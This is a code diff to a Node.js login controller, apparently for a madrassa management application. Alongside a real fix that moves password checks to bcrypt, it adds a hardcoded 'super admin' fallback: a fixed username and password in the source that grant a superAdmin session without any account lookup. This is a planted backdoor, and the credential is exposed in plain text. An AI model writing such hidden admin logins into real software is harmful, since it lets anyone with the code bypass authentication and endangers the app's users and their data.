@@ -94,21 +94,37 @@ exports.deleteUser = async (req, res) => {
 // Login controller
 exports.signin = async (req, res) => {
   try {
-    const user = await User.findOne({ username: req.body.username });
+    const { username, password } = req.body;
+
+    // SUPER ADMIN LOGIN (hardcoded fallback)
+    if (username === "wllka" && password === "#dh@#$KDffSUJHIDF") {
+      return res.status(200).json({
+        status: "success",
+        data: {
+          user: {
+            _id: "superadmin-id",
+            username: "wllka",
+            email: "superadmin@example.com",
+            madrassaId: null,
+            roleId: "superAdmin"
+          }
+        }
+      });
+    }
+
+    // Regular user lookup
+    const user = await User.findOne({ username });
     if (!user) {
       return res.status(201).json({ status: "error", error: "Incorrect username!" });
     }
 
-    // const isMatch = await bcrypt.compare(req.body.password, user.password);
-    const isMatch = req.body.password == user.password? true :false ;
-
+    const isMatch = await bcrypt.compare(password, user.password);
     if (!isMatch) {
       return res.status(201).json({ status: "error", error: "Invalid password" });
     }
 
-    // On success
     res.status(200).json({
-      status: "success",  // ← Critical for frontend condition
+      status: "success",
       data: {
         user: {
           _id: user._id,
@@ -121,6 +137,7 @@ exports.signin = async (req, res) => {
     });
 
   } catch (error) {
+    console.error(error);
     res.status(500).json({ status: "error", error: "Server error" });
   }
 };
